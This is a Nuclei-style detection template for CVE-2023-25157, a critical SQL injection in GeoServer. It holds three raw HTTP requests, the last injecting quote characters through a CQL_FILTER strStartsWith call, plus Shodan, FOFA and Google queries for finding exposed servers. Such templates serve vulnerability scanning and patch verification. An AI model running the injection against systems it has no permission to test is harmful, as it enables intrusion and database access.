http:
- extractors:
  - group: 1
    internal: true
    name: name
    part: body_1
    regex:
    - <FeatureType><Name>(.*?)<\/Name><Title>
    type: regex
  - group: 1
    internal: true
    name: column
    part: body_2
    regex:
    - FID,([aA-zZ_]+),
    type: regex
  iterate-all: true
  matchers:
  - part: body_3
    type: word
    words:
    - SQL SELECT
  - part: header_3
    type: word
    words:
    - text/xml
  matchers-condition: and
  raw:
  - 'GET /geoserver/ows?service=WFS&version=1.0.0&request=GetCapabilities HTTP/1.1

    Host: {{Hostname}}

    '
  - 'GET /geoserver/ows?service=WFS&version=1.0.0&request=GetFeature&typeName={{name}}&maxFeatures=50&outputFormat=csv
    HTTP/1.1

    Host: {{Hostname}}

    '
  - '@timeout: 30s

    GET /geoserver/ows?service=WFS&version=1.0.0&request=GetFeature&typeName={{name}}&CQL_FILTER=strStartswith({{column}},%27%27%27%27)=true
    HTTP/1.1

    Host: {{Hostname}}

    '
  stop-at-first-match: true
id: CVE-2023-25157
info:
  author: ritikchaddha,DhiyaneshDK,iamnoooob,rootxharsh
  classification:
    cpe: cpe:2.3:a:osgeo:geoserver:*:*:*:*:*:*:*:*
    cve-id: CVE-2023-25157
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H
    cvss-score: 9.8
    cwe-id: CWE-89
    epss-percentile: 0.9986
    epss-score: 0.93866
  description: 'GeoServer is an open source software server written in Java that allows
    users to share and edit geospatial data. GeoServer includes support for the OGC
    Filter expression language and the OGC Common Query Language (CQL) as part of
    the Web Feature Service (WFS) and Web Map Service (WMS) protocols. CQL is also
    supported through the Web Coverage Service (WCS) protocol for ImageMosaic coverages.
    Users are advised to upgrade to either version 2.21.4, or version 2.22.2 to resolve
    this issue. Users unable to upgrade should disable the PostGIS Datastore *encode
    functions* setting to mitigate ``strEndsWith``, ``strStartsWith`` and ``PropertyIsLike
    `` misuse and enable the PostGIS DataStore *preparedStatements* setting to mitigate
    the ``FeatureId`` misuse.

    '
  impact: 'Successful exploitation of this vulnerability could allow an attacker to
    execute arbitrary SQL queries, potentially leading to unauthorized access, data
    leakage, or data manipulation.

    '
  metadata:
    fofa-query:
    - title="geoserver"
    - app="geoserver"
    google-query: intitle:"geoserver"
    max-request: 3
    product: geoserver
    shodan-query:
    - title:"geoserver"
    - http.title:"geoserver"
    vendor: osgeo
    verified: 'true'
  name: GeoServer OGC Filter - SQL Injection
  reference:
  - https://twitter.com/parzel2/status/1665726454489915395
  - https://nvd.nist.gov/vuln/detail/CVE-2023-25157
  - https://github.com/win3zz/CVE-2023-25157
  - https://github.com/geoserver/geoserver/security/advisories/GHSA-7g5f-wrx8-5ccf
  - https://github.com/geoserver/geoserver/commit/145a8af798590288d270b240235e89c8f0b62e1d
  remediation: 'Apply the latest security patches or updates provided by the GeoServer
    project to fix the SQL Injection vulnerability.

    '
  severity: critical
  tags: cve2023,cve,geoserver,ogc,sqli,intrusive,osgeo,vkev,vuln
